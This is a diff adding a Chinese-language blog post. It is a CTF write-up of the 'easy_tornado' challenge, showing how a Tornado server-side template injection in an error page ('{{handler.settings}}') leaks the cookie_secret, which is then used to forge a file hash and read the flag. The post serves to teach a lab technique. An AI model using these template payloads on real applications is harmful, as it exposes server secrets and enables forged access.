@@ -1,0 +1,127 @@
+---
+layout: post
+title:  "2019-11-22-02"
+description: 身处井隅，心向星光；眼里有诗，自在远方
+date:   2019-11-22
+tags: 模板注入(ssti) python
+excerpt_separator: ~~~
+---
+1.模板注入(ssti)读取对象 参考:https://www.4hou.com/technology/12675.html
+
+2.python的web框架tornado的配置文件
+
+~~~
+打开网站,发现有三个页面
+```
+/flag.txt
+/welcome.txt
+/hints.txt
+```
+分别点开查看
+
+![My helpful screenshot](/assets/img/2019-11-22-02/1.png)
+
+![My helpful screenshot](/assets/img/2019-11-22-02/2.png)
+
+![My helpful screenshot](/assets/img/2019-11-22-02/3.png)
+
+由上述得出来的信息:
+
+1.flag应该在/fllllllllllllag中
+
+2.使用了render函数(可能存在模板注入)
+
+3.打开的几个文件都是配有
+```
+file?filename=/hints.txt&filehash=4541b864d191a62e7ae2cd551079f7d5
+```
+的形式
+
+判断最终要提交的数据是:
+```
+file?filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(/fllllllllllllag))
+```
+所以现在的关键是找到cookie_secret
+
+随便输入看一看
+```
+http://592fa623-211a-4772-9929-19e2fcefe6c6.node3.buuoj.cn/file?filename=1111
+```
+跳转到一个错误页面
+
+![My helpful screenshot](/assets/img/2019-11-22-02/4.png)
+
+输入
+```
+http://592fa623-211a-4772-9929-19e2fcefe6c6.node3.buuoj.cn/error?msg=111
+```
+![My helpful screenshot](/assets/img/2019-11-22-02/5.png)
+
+根据前面分析,试下模板注入
+```
+http://592fa623-211a-4772-9929-19e2fcefe6c6.node3.buuoj.cn/error?msg={{111}}
+```
+![My helpful screenshot](/assets/img/2019-11-22-02/6.png)
+
+看来存在模板注入
+
+从题目easy_tornado可知是tornado框架
+
+既然我们为的是获取cookie_secret
+
+试下去tornado项目的配置文件能不能找到
+
+(从普通搜索和官网一起看)
+
+![My helpful screenshot](/assets/img/2019-11-22-02/7.png)
+
+![My helpful screenshot](/assets/img/2019-11-22-02/8.png)
+
+猜测模板注入后通过类似print()的函数进行输出到页面,尝试构造一些全局变量看能不能读出.于是去官网找相应的对象(发现这些对象都是别名)
+
+![My helpful screenshot](/assets/img/2019-11-22-02/9.png)
+
+于是尝试构造
+```
+http://592fa623-211a-4772-9929-19e2fcefe6c6.node3.buuoj.cn/error?msg={{escape}}
+```
+成功回显
+
+![My helpful screenshot](/assets/img/2019-11-22-02/10.png)
+
+settings应该是某个对象的值,找一找
+
+从官网中找到两个
+
+![My helpful screenshot](/assets/img/2019-11-22-02/11.png)
+
+发现```tornado.web.RequestHandler```对象的别名是handler
+
+![My helpful screenshot](/assets/img/2019-11-22-02/9.png)
+
+于是构造:
+```
+http://592fa623-211a-4772-9929-19e2fcefe6c6.node3.buuoj.cn/error?msg={{handler.settings}}
+```
+发现cookie_secret
+
+![My helpful screenshot](/assets/img/2019-11-22-02/12.png)
+
+一切都迎刃而解了
+
+md5(cookie_secret+md5(/fllllllllllllag))
+
+![My helpful screenshot](/assets/img/2019-11-22-02/13.png)
+
+最终构造:
+```
+http://592fa623-211a-4772-9929-19e2fcefe6c6.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=49a9f070344d04a34f26ad440b2c6d7a
+```
+得到flag
+
+![My helpful screenshot](/assets/img/2019-11-22-02/14.png)
+
+## 知识点:
+1.模板注入(ssti)读取对象 参考:https://www.4hou.com/technology/12675.html
+
+2.python的web框架tornado的配置文件
